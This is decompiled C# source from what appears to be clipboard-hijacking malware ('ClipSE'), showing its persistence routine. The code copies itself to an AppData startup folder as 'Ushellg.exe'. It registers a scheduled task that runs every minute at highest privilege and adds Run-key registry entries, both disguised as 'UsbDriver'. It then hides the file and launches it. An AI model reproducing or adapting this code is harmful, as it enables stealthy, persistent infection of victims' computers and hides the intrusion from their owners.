using System;
using System.IO;
using System.Threading;

namespace ClipSE
{
	// Token: 0x0200001C RID: 28
	public static class InjReg
	{
		// Token: 0x06000056 RID: 86 RVA: 0x00004278 File Offset: 0x00002478
		public static void CopyAndShelduderInizialize()
		{
			ProcessControl.KillClipInizialize();
			string startUpFromAppDataReserv = GlobalPath.StartUpFromAppDataReserv;
			string text = Path.Combine(startUpFromAppDataReserv, Path.GetFileName(GlobalPath.AssemblyPath.Replace(GlobalPath.AssemblyPath, "Ushellg.exe")));
			RunSystem.Scheduler(false, "minute", 1, "highest", "UsbDriver", "\"" + text + "\"");
			RegistryControl.RegStartupInizialize(false, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "UsbDriver", text);
			Directory.Delete(GlobalPath.StartUpFromAppDataReserv);
			Thread.Sleep(2000);
			if (!Directory.Exists(startUpFromAppDataReserv) && GlobalDirectory.CreateDirectory(startUpFromAppDataReserv))
			{
				File.Copy(GlobalPath.AssemblyPath, text, false);
				Thread.Sleep(2000);
				if (File.Exists(text))
				{
					if (RunCheck.IsUserAdministrator())
					{
						RunSystem.Scheduler(true, "minute", 1, "highest", "UsbDriver", "\"" + text + "\"");
						RegistryControl.RegStartupInizialize(true, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "UsbNDriver", text);
						if (!GlobalFile.IsHideOrNo())
						{
							GlobalFile.HideFile(text, FileAttributes.Hidden);
							return;
						}
					}
					else
					{
						RegistryControl.RegStartupInizialize(true, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "UsbNDriver", text);
						if (!GlobalFile.IsHideOrNo())
						{
							GlobalFile.HideFile(text, FileAttributes.Hidden);
						}
						ProcessControl.RunFile(text);
					}
				}
			}
		}
	}
}
